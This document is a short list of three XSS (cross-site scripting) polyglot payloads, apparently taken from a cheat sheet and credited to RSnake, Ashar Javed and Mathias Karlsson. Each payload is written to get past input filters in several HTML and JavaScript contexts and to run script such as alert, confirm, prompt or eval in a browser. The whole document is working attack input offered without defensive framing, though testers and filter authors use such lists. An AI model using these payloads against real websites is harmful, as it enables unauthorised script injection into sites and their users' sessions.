Multi-context, filter bypass based polyglot payload #1 (Rsnake XSS Cheat Sheet)
```
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```

Multi-context, filter bypass based polyglot payload #2 (Ashar Javed XSS Research)
```
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg"> 
```

Multi-context polyglot payload (Mathias Karlsson)
```
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
```
